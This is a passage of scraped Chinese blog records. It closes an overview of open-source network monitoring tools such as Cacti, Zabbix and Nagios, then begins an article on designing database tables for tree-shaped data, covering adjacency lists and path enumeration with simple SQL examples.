提供了一个时尚且整洁的用户体验，提供了易于阅读的快速洞察工具以及重要的网络统计信息，例如网络状态、已上报的告警、已部署的代理数量和其他最近执行任务的列表。</p>\n<p>Pandora FMS可以在无需外部访问的情况下执行网络诊断，这意味着用户可以更快地响应任何网络问题。事实上，FMS声称，在代理模式下的器监控系统响应速度约为10秒。</p>\n<h3><strong>3. 开源网络监控工具: Cacti</strong></h3>\n<p><img src=\"https://static.oschina.net/uploads/space/2017/0610/225046_S2NE_2894582.jpg\"></p>\n<p>最初发布于2001年，<a href=\"http://www.cacti.net/\" target=\"_blank\" rel=\"nofollow\"> Cacti</a> 是一款开源的基于Web的网络监控和专为数据记录而设计的图形化工具。它可以用于实时显示网络数据，如CPU负载或带宽利用率。</p>\n<p>Cacti是RRDtool的前端应用程序，RRDtool是一种用于存储实时变化数据的开源数据库工具，其使用SNMP作为其默认收集算法，但如果你喜欢本地Perl的PHP脚本，那么你也可以使用它们。</p>\n<p>其最新版本0.8.8h于2016年5月发布，主要功能包括无限图形项目、图形自动填充支持、图形数据处理、自定义数据采集脚本、内置SNMP支持、图形模板、数据源模板、主机模板和基于用户的管理。</p>\n<h3><strong>4. 开源网络监控工具: GroundWork Monitor Core</strong></h3>\n<p><img src=\"https://static.oschina.net/uploads/space/2017/0610/225056_4gdH_2894582.jpg\"></p>\n<p><a href=\"https://www.gwos.com/\" target=\"_blank\" rel=\"nofollow\">GroundWork Monitor Core</a> 是监控网络、应用和云计算使用情况的平台。开源版本包含最多可监控50个设备和基于社区的支持的许可证，该软件还有其对应的商业版本。</p>\n<p>在其网络管理功能方面，GroundWork提供网络和设备的自发现和维护、拓扑、报警控制、通过API/SNMP/IPMI的数据收集和对OpenDaylight SDN的支持等功能。</p>\n<p>GroundWork还提供了存储管理，支持大规模的企业级供应商，如NetApp和EMC，以及从磁盘、块或对象存储的数据收集和存储缓冲以及中断可视化。<br>\n由于GroundWork的一站式网络管理方法，这种套件可能更适合那些寻找成熟品牌的大型商业和企业，而不是以开发人员为重点的工具，如Big Brother或Big Sister。</p>\n<h3><strong>5. 开源网络监控工具：Hyperic</strong></h3>\n<p><img src=\"https://static.oschina.net/uploads/space/2017/0610/225111_6poD_2894582.jpg\"></p>\n<p>VMware的<a href=\"http://www.vmware.com/products/vrealize-hyperic.html\" target=\"_blank\" rel=\"nofollow\">Hyperic</a>工具用于在物理、虚拟或云环境下监控Web应用程序及其性能。 它适用于应用程序服务器，web服务器，数据库，操作系统，虚拟机管理程序，消息传递服务和目录服务器。</p>\n<p>Hyperic提供基础架构和操作系统监控，详细的报告，应用程序和中间件监控，警报和修复工作流程以及通用可扩展的API。</p>\n<p>该网络监控工具提供了企业版本，可以提高网络警报功能，并且能更好地创建基准。</p>\n<h3><strong>6. 开源网络监控工具: Observium</strong></h3>\n<p><img src=\"https://static.oschina.net/uploads/space/2017/0610/225121_LLdQ_2894582.jpg\"></p>\n<p>基于Linux的<a href=\"http://www.observium.org/\" target=\"_blank\" rel=\"nofollow\">Observium</a>是一个自动监测的网络监控工具。 据该网站介绍，“该工具是由一批经验丰富的专业网络工程师和系统管理员开发和维护的，Observium是一个由用户自己设计和构建的平台。”</p>\n<p>Observium提供社区版本和专业版，使用RRDTool进行缓冲存储和图形化功能，并具有易于使用的用户界面和报告功能。 但是，它没有报告导出功能，这可能对商务应用来讲会是一个问题。</p>\n<p>社区版本将为用户提供对所有支持设备或指标的完整自动监测功能，通过自动发现协议进行网络映射，自动识别数百种设备，并且每六个月发布一个新版本。</p>\n<p>而专业版用户将获得所有社区版本的功能并且还将获得实时软件更新和修复功能，基于规则的自动分组功能，网络阈值和状态警报系统以及流量统计系统。</p>\n<h3><strong>7. 开源网络监控工具: Zabbix</strong></h3>\n<p><img src=\"https://static.oschina.net/uploads/space/2017/0610/225227_Aw2c_2894582.jpg\"></p>\n<p><a href=\"http://www.zabbix.com/\" target=\"_blank\" rel=\"nofollow\">Zabbix</a> 作为企业级的网络监控工具，通过从服务器，虚拟机和网络设备收集的数据提供实时监控，自动发现，映射和可扩展等功能。</p>\n<p>Zabbix的企业级监控软件为用户提供内置的Java应用服务器监控，硬件监控，VMware监控和CPU，内存，网络，磁盘空间性能监控。</p>\n<p>该企业级网络监控工具能够每分钟进行 3,000,000 次检查，具有更高的安全性和数据中心监控功能。</p>\n<h3><strong>8. 开源网络监控工具: Nagios</strong></h3>\n<p><img src=\"https://static.oschina.net/uploads/space/2017/0610/225235_kIpK_2894582.jpg\"></p>\n<p><a href=\"https://www.nagios.org/\" target=\"_blank\" rel=\"nofollow\">Nagios</a> 是一款用于监控IT基础架构和查看当前状态、历史日志和基本报告的开源软件工具。 Nagios 用户可以监控系统指标，网络协议，应用程序，服务器，网络基础架构和接收故障警报。</p>\n<p>Nagios提供三种类型的网络管理工具，Nagios XL，Nagios日志服务器和Nagios网络分析器。其中 Nagios XL 最适合网络监控（尽管其他两种也提供网络监控服务）。</p>\n<p>Nagios XL提供企业级网络监控，为用户提供带宽报告，网络心跳监控，自定义URL，电子邮件报告和远程机器监控。 升级的企业版提供基于Web的服务器控制台访问，业务流程监控，记录审核和自动化删除功能。</p>\n<h3><strong>9. 开源网络监控工具: NetDisco</strong></h3>\n<p><img src=\"https://static.oschina.net/uploads/space/2017/0610/225246_lLsB_2894582.jpg\"></p>\n<p><a href=\"https://metacpan.org/pod/App::Netdisco\" target=\"_blank\" rel=\"nofollow\">NetDisco</a>专为类 Unix 操作系统而设计，通过NSMP提供基于网络的自动发现网络设备的功能，从而生成网络拓扑图。它是专为中型到大型网络而设计的。</p>\n<p>该网络管理工具可用于定位设备，创建设备目录并报告IP地址和交换机端口使用情况。</p>\n<p>NetDisco用户可以通过MAC或IP在网络上定位机器，关闭交换机端口，或更改端口的VLAN或PoE状态，按照型号，供应商，软件和操作系统对网络硬件进行清点，并给你的网络创建一个详细的拓扑图。</p>\n<h3></h3>\n<h3><strong>10. 开源网络监控工具: OpenNMS</strong></h3>\n<p><img src=\"https://static.oschina.net/uploads/space/2017/0610/225255_FOmY_2894582.jpg\"></p>\n<p><a href=\"https://www.opennms.org/en\" target=\"_blank\" rel=\"nofollow\">OpenNMS</a>是在1999年发布的，旨在为大型企业级用户提供事件管理，服务监控和性能测量。</p>\n<p>使企业用户受益的主要特点包括外部脚本、向通话系统工程师发送警报、扩展Java本机通知策略API、请求跟踪（RT）集成、高级警报、IPv4和IPv6网络可达性超过ICMP、测试状态和节点库存信息。</p>\n<p>企业服务或是“风格”网络提供预置事件，通知，数据收集，工作流和附加报告等功能。</p>\n<h3><strong>11. 开源网络监控工具：RANCID</strong></h3>\n<p><img src=\"https://static.oschina.net/uploads/space/2017/0610/225304_sbWJ_2894582.jpg\"></p>\n<p><a href=\"http://www.shrubbery.net/rancid/\" target=\"_blank\" rel=\"nofollow\">RANCID</a> 听起来像一个消极的名字，除非你学会Really Awesome New Cisco的配置。这一点意味着它能监视路由器或其他设备的配置，并维护任何更改过的历史记录。RANCID 支持很多供应商设备，包括 Juniper路由，HP交换机，Redback的NAS 和 很多对Observium有扩展设备的支持。</p>\n<p>RANCID支持许多供应商的设备，包括Juniper路由器，HP交换机，Redback NAS和许多其他设备，以及对Observium的扩展支持。</p>\n<p>RANCID提供多种网络管理功能，包括登录到路由器表（router.db）中的每个设备，运行各种命令以获取将被保存的信息，将之前收集的信息中的任何变化发送到邮件列表，并提交这些更改到版本控制系统。</p>\n<h3></h3>\n<h3><strong>12. 开源网络监控工具: Xymon</strong></h3>\n<p><img src=\"https://static.oschina.net/uploads/space/2017/0610/225312_W73h_2894582.jpg\"></p>\n<p>另一个需要提及的网络监控工具是Xymon（以前称为Hobbit）。 Xymon监控服务器，应用程序和网络，通过网页提供有关所有这些网络组件运行状况的信息。</p>\n<p>其网站上表示Xymon的开发受到Big Brother的启发，同Big Sister一样，它试图解决Big Brother BTF的缺点，如性能方面。 同时，Xymon更容易部署并且是免费的。</p>\n<h3><strong>13. 开源网络监控工具: Big Brother BTF</strong></h3>\n<p><img src=\"https://static.oschina.net/uploads/space/2017/0610/225324_M2Lp_2894582.jpg\"> Big Brother创建于20世纪90年代中期，用于监控网络系统，后来被Quest Software收购，而其又被戴尔在2012年收购。</p>\n<p>许多其他网络监控工具都是模仿Big Brother的，所以它有一个大型的、详细的论坛和有帮助的开发人员社区，是初学者的好选择。</p>\n<p>除了可用于学生和非商业用途的开源版本之外，其还提供了名为Big Brother Professional Edition的商业版本。</p>\n<h3><strong>14. 开源网络监控工具: Big Sister</strong></h3>\n<p><img src=\"https://static.oschina.net/uploads/space/2017/0610/225337_KP2a_2894582.jpg\"></p>\n<p><a href=\"http://www.bigsister.ch/bigsister.html\" target=\"_blank\" rel=\"nofollow\">Big Sister</a>创始人托马斯·艾比（Thomas Aeby）表示，他对Big Brother的网络监控印象深刻，但希望提高其性能，减少坏事件发生时的警报数量，并进行其他改进。</p>\n<p>Big Sister提供网络监控，节点管理，doxygen过滤器和Web应用程序框架，作为Unix衍生产品和Microsoft Windows操作系统的一部分。</p>\n<p>Big Sister对监控网络系统的IT管理员有所帮助。当系统故障时，它会通知管理员，生成状态变化历史记录日志并显示各种系统性能数据。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111458\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111458votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111458\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 6 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["https://static.oschina.net/uploads/space/2017/0610/222601_ElXA_2894582.jpg"], "fav_nums": 6, "comment_nums": 0, "create_date": "2017/06/13", "praise_nums": 1}
{"tags": "数据库,IT技术", "front_image_path": "full/f42d1238aa0f889b8988c70dd7481c7a4bd3b456.jpg", "title": "数据库表设计，没有最好只有最适合", "url_object_id": "52eedb3aeec8f1a1932227ad6444af49", "url": "http://blog.jobbole.com/111111/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"http://www.cnblogs.com/xiaoxiaoqingyi/p/6954349.html\">小小情意</a>   </div><p>我们在设计数据库的时候，是否会突破常规，找到最适合自己需求的设计方案，下面来举个例子：</p>\n<p>常用的邻接表设计，都会添加 一个 parent_id 字段，比如区域表（国、省、市、区）：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd09f352e2087904964\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" touchscreen minimize scroll-mouseover\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nCREATE TABLE Area (\r\n[id] [int]  NOT NULL,\r\n[name] [nvarchar]  (50) NULL,\r\n[parent_id] [int]  NULL,\r\n[type] [int]  NULL );</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd09f352e2087904964-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd09f352e2087904964-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd09f352e2087904964-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd09f352e2087904964-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bd09f352e2087904964-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd09f352e2087904964-1\"><span class=\"crayon-e\">CREATE </span><span class=\"crayon-e\">TABLE </span><span class=\"crayon-e\">Area</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd09f352e2087904964-2\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">id</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\">  </span><span class=\"crayon-st\">NOT</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">NULL</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-594bd09f352e2087904964-3\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">name</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">nvarchar</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\">  </span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">50</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">NULL</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd09f352e2087904964-4\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">parent_id</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\">  </span><span class=\"crayon-t\">NULL</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line\" id=\"crayon-594bd09f352e2087904964-5\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">type</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\">  </span><span class=\"crayon-t\">NULL</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0013 seconds] -->\r\n<p>name:地域的名称， parent_id 是父ID，省的父ID是国，市的父ID 为省，以此类推。</p>\n<p>type 是区域的阶级： 1：国，2：省，3：市，4：区</p>\n<p>在层级比较确定的情况下，这么设计表格没有什么问题，调用起来也很方便。</p>\n<p>但是使用这种邻接表设计方式，并不能满足所有的需求，当我们不确定层级的情况下，假设我有下面一个评论结构：</p>\n<p><img src=\"http://img.blog.csdn.net/20170606203512792\" alt=\"\"></p>\n<p>用邻接表记录这个评论的数据（comments 表）：</p>\n<table border=\"1\" cellspacing=\"0\" cellpadding=\"0\">\n<colgroup>\n<col>\n<col>\n<col>\n<col></colgroup>\n<tbody>\n<tr>\n<td>comment_id</td>\n<td>parent_id</td>\n<td>author</td>\n<td>comment</td>\n</tr>\n<tr>\n<td>1</td>\n<td>0</td>\n<td>小明</td>\n<td>我不大认同这个观点</td>\n</tr>\n<tr>\n<td>2</td>\n<td>1</td>\n<td>小张</td>\n<td>我也不认同</td>\n</tr>\n<tr>\n<td>3</td>\n<td>2</td>\n<td>小红</td>\n<td>我同意楼上</td>\n</tr>\n<tr>\n<td>4</td>\n<td>1</td>\n<td>小全</td>\n<td>你为什么不认同呢</td>\n</tr>\n<tr>\n<td>5</td>\n<td>4</td>\n<td>小明</td>\n<td>我以前遇到过这情况</td>\n</tr>\n<tr>\n<td>6</td>\n<td>5</td>\n<td>小张</td>\n<td>那也不代表你所说是对的</td>\n</tr>\n<tr>\n<td>7</td>\n<td>5</td>\n<td>小新</td>\n<td>这个视情况而定吧</td>\n</tr>\n</tbody>\n</table>\n<p>大家有没发现，这么设计表，如果要查询一个节点的所有后代，是很难实现的，你可以使用关联查询来获取一条评论和他的后代：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd09f352f5234323020\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" touchscreen minimize scroll-mouseover\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nSELECT c1.*, c2.* FROM comments c1 LEFT OUTER JOIN comments c2 ON c2.parent_id = c1.comment_id;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd09f352f5234323020-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd09f352f5234323020-1\"><span class=\"crayon-e\">SELECT </span><span class=\"crayon-v\">c1</span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">*</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">c2</span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">FROM </span><span class=\"crayon-e\">comments </span><span class=\"crayon-e\">c1 </span><span class=\"crayon-e\">LEFT </span><span class=\"crayon-e\">OUTER </span><span class=\"crayon-e\">JOIN </span><span class=\"crayon-e\">comments </span><span class=\"crayon-e\">c2 </span><span class=\"crayon-e\">ON </span><span class=\"crayon-v\">c2</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">parent_id</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">c1</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">comment_id</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p>然而这个查询只能获取两层的数据。这种树的特性就是可以任意深地拓展，你需要有相应的方法来获取它的深度数据。比如，可能需要计算一个评论分支的数量，或者计算一个机械设备的所有的总开销。</p>\n<p>某些情况下，在项目中使用邻接表正好适用。邻接表设计的优势在于能快速的获取一个给定节点的直接父子节点，它也很容易插入新节点。如果这样的需求就是你的项目对于分层数据的全部操作，那使用邻接表就可以很好的工作了。</p>\n<p>遇到上述的树模型，有几种方案是可以考虑下的：路径枚举、嵌套集以及闭包表。这些解决方案通常看上去比邻接表复杂很多，但它们的确使得某些使用邻接表比较复杂或很低效的操作变得更简单。如果你的项目确实需要提供这些操作，那么这些设计会是邻接表更好的选择。</p>\n<h3>一、路径枚举</h3>\n<p>在comments 表中，我们使用类型varchar 的path 字段来替代原来的parent_id 字段。这个path 字段所存储的内容为当前节点的最顶层祖先到它的自己的序列，就像UNIX的路径一样，你甚至可以使用 ‘/’ 作为路径的分隔符。</p>\n<table border=\"1\" cellspacing=\"0\" cellpadding=\"0\">\n<colgroup>\n<col>\n<col>\n<col>\n<col></colgroup>\n<tbody>\n<tr>\n<td>comment_id</td>\n<td>path</td>\n<td>author</td>\n<td>comment</td>\n</tr>\n<tr>\n<td>1</td>\n<td>1</td>\n<td>小明</td>\n<td>我不大认同这个观点</td>\n</tr>\n<tr>\n<td>2</td>\n<td>1/2</td>\n<td>小张</td>\n<td>我也不认同</td>\n</tr>\n<tr>\n<td>3</td>\n<td>1/2/3</td>\n<td>小红</td>\n<td>我同意楼上</td>\n</tr>\n<tr>\n<td>4</td>\n<td>1/4</td>\n<td>小全</td>\n<td>你为什么不认同呢</td>\n</tr>\n<tr>\n<td>5</td>\n<td>1/4/5</td>\n<td>小明</td>\n<td>我以前遇到过这情况</td>\n</tr>\n<tr>\n<td>6</td>\n<td>1/4/5/6</td>\n<td>小张</td>\n<td>那也不代表你所说是对的</td>\n</tr>\n<tr>\n<td>7</td>\n<td>1/4/5/7</td>\n<td>小新</td>\n<td>这个视情况而定吧</td>\n</tr>\n</tbody>\n</table>\n<p>你可以通过比较每个节点的路径来查询一个节点祖先。比如：要找到评论#7， 路径是 1/4/5/7一 的祖先，可以这么做：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd09f352ff827038367\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" touchscreen minimize scroll-mouseover\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nSELECT * FROM comments AS c WHERE '1/4/5/7' LIKE c.path || '%' ;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd09f352ff827038367-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd09f352ff827038367-1\"><span class=\"crayon-e \">SELECT *</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">FROM </span><span class=\"crayon-e\">comments </span><span class=\"crayon-st\">AS</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">c</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">WHERE</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'1/4/5/7'</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">LIKE</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">c</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">path</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">||</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'%'</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>这句话查询语句会匹配到路径为 1/4/5/%，1/4/% 以及 1/% 的节点，而这些节点就是评论#7的祖先。</p>\n<p>同时还可以通过将LIKE 关键字两边的参数互换，来查询一个给定节点的所有后代。比如查询评论#4，路径path为 ‘1/4’ 的所有后代，可以使用如下语句：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd09f3530c526116246\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" touchscreen minimize scroll-mouseover\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nSELECT * FROM comemnts AS c WHERE c.path LIKE '1/4' || '%' ;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td 